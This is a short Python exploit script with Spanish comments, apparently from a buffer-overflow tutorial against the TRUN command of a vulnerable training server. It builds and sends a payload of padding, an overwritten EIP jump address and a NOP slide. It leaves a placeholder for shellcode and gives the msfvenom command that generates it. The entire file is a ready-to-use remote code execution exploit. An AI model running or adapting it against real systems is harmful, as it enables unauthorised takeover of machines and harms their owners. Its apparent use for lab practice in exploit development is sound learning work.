
import socket
import sys
import time
from struct import pack

if len(sys.argv) < 2:
    print("Uso: python3 exploit_send.py <IP> [port]")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

terminator = b"\r\n"

prefix = b"TRUN "  
buffer = b"." * 2007

eip = pack('<L', 0x625011af) #JMP 

shellcode =  b"\x90" * 16 #NOP slide

#recuerda poner el shell code generado con MSFVENOM
#msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f py -v shellcode EXITFUNC=thread
#cualquier duda, consulta el video en YT.



payload = prefix + buffer + eip + shellcode + terminator
print(f"[*] Enviando {len(payload)} bytes a {ip}:{port}")

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5.0)
        s.connect((ip, port))
        s.sendall(payload)
        
        time.sleep(1.0)
        try:
            resp = s.recv(4096)
            print("[*] Recibido:", resp[:200])
        except socket.timeout:
            print("[*] No hubo respuesta (timeout). El servidor puede haber crasheado o estar bloqueado.")
except Exception as e:
    print("[!] Error al conectar:", e)
